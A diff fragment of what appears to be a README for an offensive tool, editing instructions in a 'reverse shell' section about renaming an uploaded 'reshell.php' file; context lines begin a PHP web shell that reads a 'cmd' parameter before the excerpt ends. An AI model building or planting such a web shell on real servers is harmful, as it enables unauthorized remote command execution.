@@ -11,7 +11,7 @@
 
 ## Create file or reverse shell section
 #### here you can upload any file just copy the content of this file and the output will give you the link of it to acssess
-#### you can edit the name and the extension in the source code from "reshell.php" to what you like
+#### you can edit the name and the extension in the source code from $path variable which equal "reshell.php" by default to what you like
 ```php
 <?php
 	if(isset($_GET['cmd']))
